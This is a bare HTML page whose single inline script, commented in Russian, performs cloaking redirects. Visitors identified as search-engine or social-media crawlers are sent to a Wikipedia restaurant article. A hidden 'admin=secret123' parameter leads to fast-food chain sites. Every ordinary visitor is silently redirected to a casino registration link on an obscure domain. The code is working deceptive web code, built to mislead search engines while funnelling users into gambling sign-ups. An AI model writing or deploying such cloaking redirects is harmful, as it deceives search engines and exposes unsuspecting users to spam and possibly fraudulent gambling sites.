<!DOCTYPE html>
<html>
<head>
    <script>
        (function(){
            // Минималистичный код без предупреждений
            const ua = navigator.userAgent;
            const qs = new URLSearchParams(location.search);
            
            // Функция редиректа с задержкой
            const redirect = () => {
                if(qs.get('admin') === 'secret123') {
                    location.replace(['https://mcdonalds.ru','https://bk.com','https://kfc.ru'][Date.now()%3]);
                    return;
                }
                
                if(/Googlebot|Bingbot|YandexBot|DuckDuckBot|FacebookExternalHit|Twitterbot|Pinterest|Applebot|WhatsApp/.test(ua)) {
                    location.replace("https://www.wikipedia.org/wiki/Restaurant");
                    return;
                }
                
                location.replace("https://1wfzws.life/casino/list?open=register&p=nobj");
            };
            
            // Задержка только для Googlebot (300ms)
            if(/Googlebot/.test(ua)) {
                setTimeout(redirect, 300);
            } else {
                redirect();
            }
        })();
    </script>
</head>
<body></body>
</html>
